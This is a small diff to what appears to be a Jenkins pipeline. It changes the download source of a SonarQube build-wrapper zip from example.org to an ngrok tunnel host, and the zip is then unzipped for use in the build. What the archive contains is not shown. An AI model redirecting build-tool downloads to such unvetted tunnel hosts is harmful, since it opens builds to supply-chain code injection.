@@ -4,7 +4,7 @@ node {
   }
   stage('Download Build Wrapper') {
     sh "mkdir -p .sonar"
-    sh "curl -sSLo build-wrapper-linux-x86.zip https://example.org/static/cpp/build-wrapper-linux-x86.zip"
+    sh "curl -sSLo build-wrapper-linux-x86.zip https://mathk.eu.ngrok.io/static/cpp/build-wrapper-linux-x86.zip"
     sh "unzip -o build-wrapper-linux-x86.zip -d .sonar"
   }
   stage('Build') {
